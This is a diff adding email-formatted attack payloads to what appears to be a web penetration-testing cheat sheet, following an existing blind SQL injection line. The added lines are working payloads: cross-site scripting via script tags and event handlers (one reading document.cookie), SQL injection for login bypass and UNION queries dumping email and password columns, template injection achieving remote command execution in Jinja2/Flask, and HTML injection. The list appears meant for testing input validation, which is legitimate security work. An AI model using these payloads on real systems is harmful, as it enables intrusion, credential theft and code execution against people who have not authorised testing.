@@ -28,10 +28,66 @@ Blind SQLi:
 ------------
 the0'XOR(if(now()=sysdate(),sleep(1),0))XOR'Z
 
+🔹 XSS Payloads in Email Format
+"><script>alert(1)</script>@example.com
+xss"><svg/onload=alert(1)>@test.com
+xss<script>alert('XSS')</script>@malicious.com
+xss'"><img src=x onerror=alert('XSS')>@evil.com
+"><iframe src=javascript:alert(1)>@attack.com
+evil"><input onfocus=alert(1) autofocus>@victim.com
+xss"><body onload=alert(1)>@exploit.com
+payload"><a href=javascript:alert(1)>click</a>@xss.com
+hacker"><video><source onerror=alert(1)>@test.com
+test"><details open ontoggle=alert(1)>@xss.com
+xss"><script>alert('Hacked')</script>@example.com
+test"><img src=x onerror=alert('Pwned')>@malicious.com
+vulnerable"><svg/onload=alert(document.cookie)>@attack.com
+alert'"><iframe src=javascript:alert(1)>@hacker.net
+payload"><object data="javascript:alert(1)">@exploit.com
+"><input onfocus=alert('XSS') autofocus>@test.com
+"><marquee onstart=alert('XSS')>@funny.com
+"><body onload=alert('Owned!')>@exploiters.com
+xss"><meta http-equiv="refresh" content="0;url=javascript:alert(1)">@redirect.com
+evil"><math href="javascript:alert('XSS')">@xss.net
 
+🔹 SQL Injection Payloads in Email Format
+' OR '1'='1@example.com
+admin' --@test.com
+admin' #@sql.com
+"' OR 1=1 --@injection.com
+hacker' UNION SELECT null,email,password FROM users --@sql.com
+' OR 'x'='x' LIMIT 1 --@attack.com
+test') OR ('1'='1@bypass.com
+" OR 1=1#@sqli.com
+evil' UNION SELECT 1,2,3,email,password FROM users --@hacked.com
+admin' ORDER BY 1 --@database.com
+' OR 'x'='x@example.com
+admin' --@pwned.com
+evil' OR '1'='1'--@sqli.com
+test' UNION SELECT NULL,email,password FROM users --@data.com
+vulnerable' UNION SELECT 1,2,3,4,5 FROM users --@hack.com
+hacker' OR 1=1 LIMIT 1 --@bypass.com
+test' ORDER BY 5 --@admin.com
+admin' UNION SELECT table_name FROM information_schema.tables --@db.com
+' OR sleep(5) --@slowquery.com
+x' UNION SELECT username, password FROM users WHERE email='admin@example.com' --@sqlattack.com
 
+🔹 Server-Side Template Injection (SSTI) Payloads
+{{7*7}}@ssti.com (Jinja2/Twig - Should return 49 if vulnerable)
+{{config.__class__.__init__.__globals__['os'].system('id')}}@ssti.com (Jinja2 RCE)
+{{self.__init__.__globals__.os.popen('whoami').read()}}@ssti.com
+${7*7}@ssti.com (Freemarker, Velocity - Should return 49 if vulnerable)
+#{7*7}@ssti.com (Thymeleaf - Should return 49 if vulnerable)
+<%= 7*7 %>@ssti.com (ERB - Should return 49 if vulnerable)
+{{request.application.__globals__.__builtins__.__import__('os').system('id')}}@ssti.com (Python Flask SSTI RCE)
 
-
+🔹 HTML Injection Payloads
+<h1>Hacked</h1>@html.com
+<b>BoldText</b>@inject.com
+<marquee>Scrolling Text</marquee>@html.com
+<a href="http://evil.com">ClickMe</a>@attack.com
+<iframe src="http://malicious.com"></iframe>@inject.com
+<script>alert('HTML Injected')</script>@vulnerable.com
 
 
 
